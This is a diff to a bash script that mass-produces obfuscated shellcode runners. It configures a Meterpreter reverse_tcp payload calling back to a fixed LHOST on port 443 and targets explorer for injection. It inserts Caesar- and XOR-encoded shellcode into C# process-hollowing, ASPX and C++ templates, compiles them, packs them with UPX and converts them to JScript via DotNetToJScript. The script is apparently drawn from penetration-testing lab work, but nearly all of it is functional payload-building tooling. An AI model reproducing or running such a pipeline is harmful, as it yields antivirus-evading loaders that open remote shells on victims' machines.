@@ -8,9 +8,9 @@ NET_OBFUSCATOR=$CURRENT_DIR"/NET-Obfuscate/NET-Obfuscate.exe"
 OUTPUT_CAESAR_DIR=$CURRENT_DIR"/payloads/ConfuserEx/Caesar"
 OUTPUT_XOR_DIR=$CURRENT_DIR"/payloads/ConfuserEx/XOR"
 
-PROCESS_TO_INJECT="notepad"
+PROCESS_TO_INJECT="explorer"
 MSFVENOM_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
-LHOST="192.168.100.128"
+LHOST="192.168.49.109"
 LPORT=443
 
 
@@ -58,11 +58,17 @@ sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_
 sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' Templates/Caesar/shellcode_runner_assembly_numa.cs
 sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' Templates/Caesar/shellcode_runner_assembly_numa_marshal.cs
 sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' Templates/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.cs
+sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' Templates/Caesar/shellcode_runner_hollow.cs
+sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' Templates/Caesar/shellcode_runner_hollow_dotnet2jsscript.cs
+sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' payloads/ASPX/shellcode_runner_caesar.aspx
 
 sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_assembly.cs
+sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_assembly_dotnet2jsscript.cs
 sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_assembly_numa.cs
 sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_assembly_numa_marshal.cs
 sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_assembly_FlsAlloc_marshal.cs
+sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_hollow.cs
+sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_hollow_dotnet2jsscript.cs
 
 sed -i 's/unsigned char enc_payload.. . .*./unsigned char enc_payload[] = { '"${XORED_SHELLCODEv2}"' };/g' Templates/XOR/shellcode_runner_xor.cpp
 
@@ -73,11 +79,16 @@ mcs -target:library -out:payloads/Caesar/shellcode_runner_assembly.dll Templates
 mcs -target:library -out:payloads/Caesar/shellcode_runner_assembly_numa.dll Templates/Caesar/shellcode_runner_assembly_numa.cs &>/dev/null
 mcs -target:library -out:payloads/Caesar/shellcode_runner_assembly_numa_marshal.dll Templates/Caesar/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
 mcs -target:library -out:payloads/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.dll Templates/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null
+mcs -target:library -out:payloads/Caesar/shellcode_runner_hollow.dll Templates/Caesar/shellcode_runner_hollow.cs &>/dev/null
+mcs -target:library -out:payloads/Caesar/shellcode_runner_hollow_dotnet2jsscript.dll Templates/Caesar/shellcode_runner_hollow_dotnet2jsscript.cs &>/dev/null
 
 mcs -target:library -out:payloads/XOR/shellcode_runner_assembly.dll Templates/XOR/shellcode_runner_assembly.cs &>/dev/null
+mcs -target:library -out:payloads/XOR/shellcode_runner_assembly_dotnet2jsscript.dll Templates/XOR/shellcode_runner_assembly_dotnet2jsscript.cs &>/dev/null
 mcs -target:library -out:payloads/XOR/shellcode_runner_assembly_numa.dll Templates/XOR/shellcode_runner_assembly_numa.cs &>/dev/null
 mcs -target:library -out:payloads/XOR/shellcode_runner_assembly_numa_marshal.dll Templates/XOR/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
 mcs -target:library -out:payloads/XOR/shellcode_runner_assembly_FlsAlloc_marshal.dll Templates/XOR/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null
+mcs -target:library -out:payloads/XOR/shellcode_runner_hollow.dll Templates/XOR/shellcode_runner_hollow.cs &>/dev/null
+mcs -target:library -out:payloads/XOR/shellcode_runner_hollow_dotnet2jsscript.dll Templates/XOR/shellcode_runner_hollow_dotnet2jsscript.cs &>/dev/null
 
 #mcs -target:library -platform:x86 -out:ExampleAssembly.dll shellcode_runner.cs
 #cp ExampleAssembly.dll payloads/
@@ -88,12 +99,17 @@ mcs -out:payloads/Caesar/shellcode_runner_assembly.exe Templates/Caesar/shellcod
 mcs -out:payloads/Caesar/shellcode_runner_assembly_numa.exe Templates/Caesar/shellcode_runner_assembly_numa.cs &>/dev/null
 mcs -out:payloads/Caesar/shellcode_runner_assembly_numa_marshal.exe Templates/Caesar/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
 mcs -out:payloads/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.exe Templates/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null
+mcs -out:payloads/Caesar/shellcode_runner_hollow.exe Templates/Caesar/shellcode_runner_hollow.cs &>/dev/null
+mcs -out:payloads/Caesar/shellcode_runner_hollow_dotnet2jsscript.exe Templates/Caesar/shellcode_runner_hollow_dotnet2jsscript.cs &>/dev/null
+
 
 mcs -out:payloads/XOR/shellcode_runner_assembly.exe Templates/XOR/shellcode_runner_assembly.cs &>/dev/null
+mcs -out:payloads/XOR/shellcode_runner_assembly_dotnet2jsscript.exe Templates/XOR/shellcode_runner_assembly_dotnet2jsscript.cs &>/dev/null
 mcs -out:payloads/XOR/shellcode_runner_assembly_numa.exe Templates/XOR/shellcode_runner_assembly_numa.cs &>/dev/null
 mcs -out:payloads/XOR/shellcode_runner_assembly_numa_marshal.exe Templates/XOR/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
 mcs -out:payloads/XOR/shellcode_runner_assembly_FlsAlloc_marshal.exe Templates/XOR/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null
-
+mcs -out:payloads/XOR/shellcode_runner_hollow.exe Templates/XOR/shellcode_runner_hollow.cs &>/dev/null
+mcs -out:payloads/XOR/shellcode_runner_hollow_dotnet2jsscript.exe Templates/XOR/shellcode_runner_hollow_dotnet2jsscript.cs &>/dev/null
 
 echo "[+] Creating C++ EXE (plus UPX) ..."
 x86_64-w64-mingw32-gcc Templates/XOR/shellcode_runner_xor.cpp -o payloads/XOR/shellcode_runner_cpp.exe &>/dev/null
@@ -102,11 +118,14 @@ upx -9 payloads/XOR/shellcode_runner_cpp.exe &>/dev/null
 
 # Generate a payload
 echo "[+] Creating JS ..."
-mono DotNetToJScript.exe payloads/XOR/shellcode_runner_assembly.dll --lang=Jscript --ver=v4 -o payloads/DotNetToJScript/runner.js -c Runner.TestClass &>/dev/null
-
+mono DotNetToJScript.exe payloads/XOR/shellcode_runner_hollow_dotnet2jsscript.dll --lang=Jscript --ver=v4 -o payloads/DotNetToJScript/runner_xor.js -c Runner.TestClass &>/dev/null
+mono DotNetToJScript.exe payloads/Caesar/shellcode_runner_hollow_dotnet2jsscript.dll --lang=Jscript --ver=v4 -o payloads/DotNetToJScript/runner_caesar.js -c Runner.TestClass &>/dev/null
+mono DotNetToJScript.exe payloads/Caesar/shellcode_runner_assembly_dotnet2jsscript.dll --lang=Jscript --ver=v4 -o payloads/DotNetToJScript/runner.js -c Runner.TestClass &>/dev/null
 
 # Copy file share
 #echo "[+] shellcode_runner.js copied to Payloads"
+tr -d $'\r' < payloads/DotNetToJScript/runner_xor.js > payloads/DotNetToJScript/shellcode_runner_xor.js
+tr -d $'\r' < payloads/DotNetToJScript/runner_caesar.js > payloads/DotNetToJScript/shellcode_runner_caesar.js
 tr -d $'\r' < payloads/DotNetToJScript/runner.js > payloads/DotNetToJScript/shellcode_runner.js
 
 echo "[+] Creating HTA ..."
@@ -316,4 +335,3 @@ echo "|_________________________________________________________________________
 
 # Delete Files
 rm shellcode.txt
-
